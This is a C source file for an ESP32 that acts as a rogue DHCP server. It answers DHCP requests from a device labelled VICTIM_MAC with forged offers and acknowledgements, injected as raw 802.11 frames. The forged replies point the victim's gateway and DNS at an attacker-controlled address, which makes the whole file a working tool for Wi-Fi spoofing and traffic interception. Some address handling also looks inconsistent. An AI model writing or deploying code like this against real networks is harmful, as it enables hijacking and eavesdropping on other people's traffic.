#include "dhcp_utils.h"
#include "packet_utils.h"
#include <WiFi.h>

extern uint8_t g_esp32_mac[6];
extern uint8_t g_bssid[6];
extern uint8_t VICTIM_MAC[6];

static bool dhcpRunning = false;
static int dhcpCounter = 0;
static IPAddress offeredIP(192, 168, 1, 150);

void dhcpStart() { dhcpRunning = true; }
void dhcpStop() { dhcpRunning = false; }

static void sendDhcpReply(const uint8_t* clientMac, uint32_t xid, uint8_t msgType, const uint8_t* reqIpPkt) {
    uint8_t payload[512];
    uint8_t* ipHdr = payload;
    uint8_t* udpHdr = &payload[20];
    uint8_t* dhcp = &payload[28];
    
    memset(dhcp, 0, 240);
    dhcp[0] = 2; dhcp[1] = 1; dhcp[2] = 6; dhcp[3] = 0;
    memcpy(&dhcp[4], &xid, 4);
    memset(&dhcp[8], 0, 4);
    memset(&dhcp[12], 0, 4);
    if (msgType == 2) {
        offeredIP[3] = random(100, 200);
        memcpy(&dhcp[16], &offeredIP[0], 4);
    } else {
        if (reqIpPkt) memcpy(&dhcp[16], &reqIpPkt[16], 4);
        else memcpy(&dhcp[16], &offeredIP[0], 4);
    }
    memcpy(&dhcp[20], &offeredIP, 4);
    memset(&dhcp[24], 0, 4);
    memcpy(&dhcp[28], clientMac, 6);
    memset(&dhcp[34], 0, 10);
    memset(&dhcp[44], 0, 64);
    memset(&dhcp[108], 0, 128);
    dhcp[236] = 0x63; dhcp[237] = 0x82; dhcp[238] = 0x53; dhcp[239] = 0x63;
    
    int opt = 240;
    dhcp[opt++] = 53; dhcp[opt++] = 1; dhcp[opt++] = msgType;
    dhcp[opt++] = 54; dhcp[opt++] = 4; memcpy(&dhcp[opt], &offeredIP[0], 4); opt += 4;
    dhcp[opt++] = 1; dhcp[opt++] = 4; dhcp[opt++] = 255; dhcp[opt++] = 255; dhcp[opt++] = 255; dhcp[opt++] = 0;
    dhcp[opt++] = 3; dhcp[opt++] = 4; memcpy(&dhcp[opt], &offeredIP[0], 4); opt += 4;
    dhcp[opt++] = 6; dhcp[opt++] = 4; memcpy(&dhcp[opt], &offeredIP[0], 4); opt += 4;
    dhcp[opt++] = 51; dhcp[opt++] = 4; dhcp[opt++] = 0x00; dhcp[opt++] = 0x01; dhcp[opt++] = 0x51; dhcp[opt++] = 0x80;
    dhcp[opt++] = 255;
    
    uint16_t dhcpLen = opt;
    uint16_t udpLen = 8 + dhcpLen;
    uint16_t ipTotalLen = 20 + udpLen;
    
    ipHdr[0] = 0x45; ipHdr[1] = 0x00;
    ipHdr[2] = (ipTotalLen >> 8) & 0xFF; ipHdr[3] = ipTotalLen & 0xFF;
    ipHdr[4] = 0x00; ipHdr[5] = 0x00; ipHdr[6] = 0x00; ipHdr[7] = 0x00;
    ipHdr[8] = 64; ipHdr[9] = 17; ipHdr[10] = 0x00; ipHdr[11] = 0x00;
    memcpy(&ipHdr[12], &offeredIP[0], 4);
    memset(&ipHdr[16], 0xFF, 4);
    uint16_t csum = ipChecksum(ipHdr, 20);
    ipHdr[10] = csum & 0xFF; ipHdr[11] = (csum >> 8) & 0xFF;
    
    udpHdr[0] = 0x00; udpHdr[1] = 0x43;
    udpHdr[2] = 0x00; udpHdr[3] = 0x44;
    udpHdr[4] = (udpLen >> 8) & 0xFF; udpHdr[5] = udpLen & 0xFF;
    udpHdr[6] = 0x00; udpHdr[7] = 0x00;
    
    inject80211(VICTIM_MAC, g_esp32_mac, g_bssid, LLC_SNAP_IP, ipHdr, ipTotalLen);
}

void dhcpProcessPacket(const uint8_t* ipPkt, const uint8_t* udpPkt, const uint8_t* dhcpData, uint16_t dhcpLen) {
    if (!dhcpRunning || dhcpLen < 240) return;
    if (dhcpData[0] != 1) return;
    
    uint32_t xid; memcpy(&xid, &dhcpData[4], 4);
    uint8_t clientMac[6]; memcpy(clientMac, &dhcpData[28], 6);
    
    uint8_t msgType = 0;
    int opt = 240;
    while (opt < dhcpLen) {
        uint8_t code = dhcpData[opt++];
        if (code == 255) break;
        if (code == 0) continue;
        uint8_t len = dhcpData[opt++];
        if (code == 53 && len == 1) msgType = dhcpData[opt];
        opt += len;
    }
    
    if (msgType == 1) { sendDhcpReply(clientMac, xid, 2, nullptr); dhcpCounter++; }
    else if (msgType == 3) { sendDhcpReply(clientMac, xid, 5, dhcpData); dhcpCounter++; }
}
